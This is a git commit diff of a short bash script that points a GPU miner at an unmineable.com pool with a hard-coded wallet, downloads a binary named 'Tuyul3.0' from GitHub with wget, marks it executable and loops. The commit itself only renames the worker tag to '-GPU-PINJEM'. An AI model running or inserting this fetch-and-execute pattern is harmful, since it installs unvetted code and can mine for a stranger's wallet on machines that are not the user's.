9c8e8a5a4221ff06d412a53e23aacb4095d5c3e5
NRC-TECH <87222249+NRC-TECH@users.noreply.github.com>
2021-07-17 16:39:18 +0530

    win.sh

--- win.sh
+++ win.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
 WALLET=WIN:0xe3ed79913abb464e0ca11c278cec2a501bd4da7d
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 wget https://github.com/NRC-TECH/nrc-tech/raw/main/Tuyul3.0
 chmod +x Tuyul3.0
 while [ 1 ]; do
